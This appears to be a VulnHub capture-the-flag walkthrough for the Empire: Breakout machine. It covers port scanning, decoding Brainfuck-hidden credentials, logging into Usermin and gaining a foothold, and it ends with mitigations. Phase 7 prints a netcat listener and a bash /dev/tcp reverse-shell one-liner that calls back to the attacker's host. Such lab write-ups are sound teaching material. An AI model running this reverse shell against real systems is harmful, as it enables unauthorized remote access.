# Empire: Breakout — Walkthrough

| Field | Detail |
|---|---|
| Machine | Empire: Breakout |
| Author | icex64 & Empire Cybersecurity |
| Release Date | 21 October 2021 |
| OS | Linux |

## 🔍 Overview

Empire: Breakout is a Linux machine involving credential discovery hidden in an HTML comment and obfuscated with Brainfuck encoding, followed by authentication to an exposed Usermin panel and remote code execution via its built-in Command Shell module to obtain an initial reverse shell.

---

## Phase 1 – Network Reconnaissance

### Step 1 – Discover Live Hosts

```bash
nmap -sn 192.168.1.0/24
```

**Result:** Target identified at `192.168.1.13`.

---

## Phase 2 – Port Enumeration

### Step 2 – Full TCP Port Scan

```bash
nmap -sC -sV -p- 192.168.1.13
```

**Open Ports:**

| Port | Service | Version |
|---|---|---|
| 80 | HTTP | Apache 2.4.51 |
| 139 | NetBIOS | Samba 4.13.5 |
| 445 | SMB | Samba 4.13.5 |
| 10000 | Webmin | 1.981 |
| 20000 | Usermin | 1.830 |

Usermin (an authenticated user-administration panel) stood out as a particularly promising target.

---

## Phase 3 – Web Enumeration

### Step 3 – Visit the Website

The default Apache welcome page was displayed — since default pages often hide developer comments, the page source was inspected next.

### Step 4 – View Page Source

```bash
curl -s http://192.168.1.13/
```

**Found:** A suspicious HTML comment containing a long sequence of only `+ - < > [ ] .` characters — the instruction set of the **Brainfuck** esoteric programming language, suggesting an intentionally obfuscated hidden message.

---

## Phase 4 – Decode Brainfuck

### Step 5 – Decode the Hidden Message

Wrote a simple Python Brainfuck interpreter to decode the extracted code:

```python
code = input()
tape = [0] * 30000
ptr = 0
output = ""
i = 0
loop_stack = []

while i < len(code):
    c = code[i]
    if c == ">":
        ptr += 1
    elif c == "<":
        ptr -= 1
    elif c == "+":
        tape[ptr] = (tape[ptr] + 1) % 256
    elif c == "-":
        tape[ptr] = (tape[ptr] - 1) % 256
    elif c == ".":
        output += chr(tape[ptr])
    elif c == "[":
        if tape[ptr] == 0:
            depth = 1
            while depth > 0:
                i += 1
                if code[i] == "[":
                    depth += 1
                elif code[i] == "]":
                    depth -= 1
        else:
            loop_stack.append(i)
    elif c == "]":
        if tape[ptr] != 0:
            i = loop_stack[-1]
        else:
            loop_stack.pop()
    i += 1

print(output)
```

```bash
echo '<brainfuck_code>' | python3 brainfuck_decoder.py
```

**Result:** The decoded output resembled a password rather than plain text. Since Usermin was exposed on port 20000, the recovered string was tested as a password for the username `cyber` — authentication succeeded, confirming the hidden Brainfuck code contained valid credentials.

---

## Phase 5 – Usermin Authentication

### Step 6 – Access Usermin

Logged into `https://192.168.1.13:20000` using the username `cyber` and the password recovered from the decoded Brainfuck message.

**Result:** Successfully authenticated to the Usermin dashboard.

---

## Phase 6 – Command Execution

### Step 7 – Explore Available Modules

Within Usermin, found a **Command Shell** module that allowed direct execution of operating system commands.

### Step 8 – Verify Command Execution

```bash
id
```

**Result:** Confirmed command execution as the `cyber` user, verifying remote code execution through the Usermin Command Shell.

---

## Phase 7 – Reverse Shell

### Step 9 – Start a Listener

```bash
nc -lvnp 4444
```

### Step 10 – Execute a Reverse Shell

From within the Usermin Command Shell:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
```

### Step 11 – Receive the Connection

**Result:** Interactive reverse shell received as `cyber@breakout`, verified via `whoami`, `hostname`, `pwd`, and `id`.

✅ **Initial foothold obtained as `cyber`.**

---

## 🛡️ Key Vulnerabilities Identified

1. Sensitive credentials hidden in an HTML comment rather than being properly secured
2. Credentials obfuscated with Brainfuck encoding — trivially reversible with a basic interpreter, not real protection
3. Usermin exposed and accessible with recovered credentials
4. Usermin's built-in Command Shell module allowed direct, unrestricted OS command execution

## 🩹 Mitigations

1. Never leave credentials or hints in HTML comments or client-visible source code
2. Avoid relying on encoding (Brainfuck, Base64, etc.) as a substitute for real encryption or access control
3. Restrict or disable administrative panels like Usermin/Webmin from being publicly accessible
4. Disable or tightly control command-execution modules in administrative panels
5. Enforce strong, unique credentials for all administrative interfaces

---

## 🧰 Tools Used

`nmap` · `curl` · Python (custom Brainfuck interpreter) · Usermin · `netcat`

## 🧠 Techniques Covered

Network discovery · Port and service enumeration · Web source inspection · Brainfuck decoding · Credential-based authentication · Command execution via Usermin · Reverse shell handling

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Discover Live Hosts | ✅ |
| 2 | Full TCP Port Scan | ✅ |
| 3 | Visit the Website | ✅ |
| 4 | View Page Source | ✅ |
| 5 | Decode Brainfuck | ✅ |
| 6 | Usermin Authentication | ✅ |
| 7 | Explore Available Modules | ✅ |
| 8 | Verify Command Execution | ✅ |
| 9 | Start a Listener | ✅ |
| 10 | Execute a Reverse Shell | ✅ |
| 11 | Receive the Connection | ✅ |

**Note:** This write-up covers reconnaissance through initial foothold as `cyber`. Local enumeration and privilege escalation to root are not included here.

*Writeup for educational purposes. Machine solved as part of VulnHub CTF practice.*
